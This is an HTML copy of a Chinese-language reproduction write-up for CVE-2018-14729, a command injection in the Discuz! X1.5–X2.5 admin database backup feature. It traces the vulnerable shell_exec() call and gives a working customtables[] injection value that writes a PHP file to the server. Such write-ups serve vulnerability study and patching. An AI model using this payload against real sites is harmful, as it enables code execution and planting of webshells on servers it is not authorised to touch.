<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X87f1c10954248b62d45396d4b10e3788a6bba0d"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-14729</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Discuz!X 1.5 ~ X2.5 </span><span class="csECDA2D3">后台数据库备份功能远程命令执行</span><span class="csDE05BCC"> Getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Discuz! X1.5-2.5</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要注意的是这个漏洞其实是需要登录后台的，并且能有数据库备份权限，所以比较鸡肋。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我这边是用</span><span class="cs8926E06">Discuz! 2.5</span><span class="cs9C1B1871">完成漏洞复现的，并用此进行漏洞分析的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞点在：</span></p><p class="cs3A447A38"><span class="cs9FB05234">source/admincp/admincp_db.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第</span><span class="cs8926E06">296</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">@shell_exec($mysqlbin.&#39;mysqldump --force --quick &#39;.($db-&gt;version() &gt; &#39;4.1&#39; ? &#39;--skip-opt --create-options&#39; : &#39;-all&#39;).&#39; --add-drop-table&#39;.($_GET[&#39;extendins&#39;] == 1 ? &#39; --extended-insert&#39; : &#39;&#39;).&#39;&#39;.($db-&gt;version() &gt; &#39;4.1&#39; &amp;&amp; $_GET[&#39;sqlcompat&#39;] == &#39;MYSQL40&#39; ? &#39; --compatible=mysql40&#39; : &#39;&#39;).&#39; --host=&quot;&#39;.$dbhost.($dbport ? (is_numeric($dbport) ? &#39; --port=&#39;.$dbport : &#39; --socket=&quot;&#39;.$dbport.&#39;&quot;&#39;) : &#39;&#39;).&#39;&quot; --user=&quot;&#39;.$dbuser.&#39;&quot; --password=&quot;&#39;.$dbpw.&#39;&quot; &quot;&#39;.$dbname.&#39;&quot; &#39;.$tablesstr.&#39; &gt; &#39;.$dumpfile);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">shell_exec()</span><span class="cs9C1B1871">函数中可控点在</span><span class="cs8926E06">$tablesstr</span><span class="cs9C1B1871">，向上看到第</span><span class="cs8926E06">281</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$tablesstr = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">foreach($tables as $table) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$tablesstr .= &#39;&quot;&#39;.$table.&#39;&quot; &#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟一下</span><span class="cs8926E06">$table</span><span class="cs9C1B1871">的获取流程，在上面的第</span><span class="cs8926E06">143</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if($_GET[&#39;type&#39;] == &#39;discuz&#39; || $_GET[&#39;type&#39;] == &#39;discuz_uc&#39;) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$tables = arraykeys2(fetchtablelist($tablepre), &#39;Name&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">elseif($_GET[&#39;type&#39;] == &#39;custom&#39;) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$tables = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(empty($_GET[&#39;setup&#39;])) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tables = C::t(&#39;common_setting&#39;)-&gt;fetch(&#39;custombackup&#39;, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C::t(&#39;common_setting&#39;)-&gt;update(&#39;custombackup&#39;, empty($_GET[&#39;customtables&#39;])? &#39;&#39; : $_GET[&#39;customtables&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tables = &amp; $_GET[&#39;customtables&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if( !is_array($tables) || empty($tables)) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cpmsg(&#39;database_export_custom_invalid&#39;, &#39;&#39;, &#39;error&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到：</span></p><p class="cs3A447A38"><span class="cs9FB05234">C::t(&#39;common_setting&#39;)-&gt;update(&#39;custombackup&#39;, empty($_GET[&#39;customtables&#39;])? &#39;&#39; : $_GET[&#39;customtables&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$tables = &amp; $_GET[&#39;customtables&#39;];</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先会从</span><span class="cs8926E06">$_GET</span><span class="cs9C1B1871">的数组中获取</span><span class="cs8926E06">customtables</span><span class="cs9C1B1871">字段的内容，判断内容是否为空，不为空则将从外部获取到的</span><span class="cs8926E06">customtables</span><span class="cs9C1B1871">字段内容写入</span><span class="cs8926E06">common_setting</span><span class="cs9C1B1871">表的</span><span class="cs8926E06">skey=custombackup</span><span class="cs9C1B1871">的</span><span class="cs8926E06">svalue</span><span class="cs9C1B1871">字段，写入过程中会将这个字段做序列化存储：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/%ef%bc%88CVE-2018-14729%ef%bc%89Discuz!%20X1.5%20~%20X2.5%20%e5%90%8e%e5%8f%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e5%a4%87%e4%bb%bd%e5%8a%9f%e8%83%bd%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%20Getshell_files/image0.jpg" width="560" height="42" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后再将该值赋给</span><span class="cs8926E06">$tables</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">至此可以看到漏洞产生的原因是由于</span><span class="cs8926E06">shell_exec()</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">$tablesstr</span><span class="cs9C1B1871">可控，导致代码注入。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先抓个包</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/%ef%bc%88CVE-2018-14729%ef%bc%89Discuz!%20X1.5%20~%20X2.5%20%e5%90%8e%e5%8f%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e5%a4%87%e4%bb%bd%e5%8a%9f%e8%83%bd%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%20Getshell_files/image1.jpg" width="560" height="239" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样可以抓到符合我们条件的请求包。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/%ef%bc%88CVE-2018-14729%ef%bc%89Discuz!%20X1.5%20~%20X2.5%20%e5%90%8e%e5%8f%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e5%a4%87%e4%bb%bd%e5%8a%9f%e8%83%bd%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%20Getshell_files/image2.jpg" width="560" height="352" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来只需要将</span><span class="cs8926E06">customtables</span><span class="cs9C1B1871">的内容更改一下就可以造成命令执行了：</span></p><p class="cs3A447A38"><span class="cs9FB05234">customtables[] = pre_common_admincp_cmenu&quot;&gt;aaa; echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; phpinfo.php #</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/%ef%bc%88CVE-2018-14729%ef%bc%89Discuz!%20X1.5%20~%20X2.5%20%e5%90%8e%e5%8f%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e5%a4%87%e4%bb%bd%e5%8a%9f%e8%83%bd%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%20Getshell_files/image3.jpg" width="560" height="275" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/%ef%bc%88CVE-2018-14729%ef%bc%89Discuz!%20X1.5%20~%20X2.5%20%e5%90%8e%e5%8f%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e5%a4%87%e4%bb%bd%e5%8a%9f%e8%83%bd%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%20Getshell_files/image4.jpg" width="560" height="446" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">效果为：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/%ef%bc%88CVE-2018-14729%ef%bc%89Discuz!%20X1.5%20~%20X2.5%20%e5%90%8e%e5%8f%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e5%a4%87%e4%bb%bd%e5%8a%9f%e8%83%bd%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%20Getshell_files/image5.jpg" width="560" height="223" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/FoolMitAh/CVE-2018-14729/blob/master/Discuz_backend_getshell.md</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://www.anquanke.com/post/id/158270</span></p></body>
</html>
